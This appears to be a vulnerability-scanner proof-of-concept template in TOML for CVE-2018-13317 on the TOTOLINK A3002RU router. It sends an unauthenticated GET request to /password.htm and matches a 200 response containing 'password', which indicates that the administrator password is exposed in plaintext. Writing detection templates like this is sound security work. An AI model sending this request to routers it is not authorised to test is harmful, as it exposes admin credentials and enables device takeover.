[info]
author = "ave"
description = "检测 TOTOLINK A3002RU 路由器是否存在 password.htm 页面导致管理员密码明文泄露漏洞"
id = "POC-AVE-2018-0078"
name = "TOTOLINK A3002RU password.htm Plaintext Password Leak PoC"
severity = "medium"
tags = ["ave-2018-0078"]
vuln_id = [
    "CVE-2018-13317",
    "AVE-2018-0078",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/password.htm"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["password"]
